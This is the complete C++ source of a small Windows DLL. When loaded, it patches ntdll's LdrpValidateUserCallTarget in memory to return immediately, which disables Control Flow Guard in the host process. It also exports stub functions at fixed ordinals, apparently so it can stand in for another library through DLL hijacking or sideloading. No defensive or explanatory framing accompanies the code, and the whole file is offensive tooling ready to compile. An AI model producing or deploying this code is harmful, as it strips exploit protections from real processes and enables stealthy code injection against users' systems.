#include <windows.h>

void PatchCFG() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;
    
    char* pTarget = (char*)GetProcAddress(hNtdll, "LdrpValidateUserCallTarget");
    if (pTarget) {
        DWORD oldProtect;
        VirtualProtect(pTarget, 3, PAGE_EXECUTE_READWRITE, &oldProtect);
        *pTarget = 0x31;       // xor eax, eax
        *(pTarget + 1) = 0xC0;
        *(pTarget + 2) = 0xC3; // ret
        VirtualProtect(pTarget, 3, oldProtect, &oldProtect);
    }
}

// Explicitly export key structural shell ordinal entryways to satisfy the loader requirements
extern "C" {
    __declspec(dllexport) void UniversalStub() {}
    
    // GCC attribute mapping to force layout slot designations natively without a .def map
    void __attribute__((alias("UniversalStub"))) Ordinal100();
    void __attribute__((alias("UniversalStub"))) Ordinal200();
    void __attribute__((alias("UniversalStub"))) Ordinal240();
    void __attribute__((alias("UniversalStub"))) Ordinal250();
    void __attribute__((alias("UniversalStub"))) Ordinal290();
}

extern "C" __declspec(dllexport) BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        PatchCFG();
    }
    return TRUE;
}
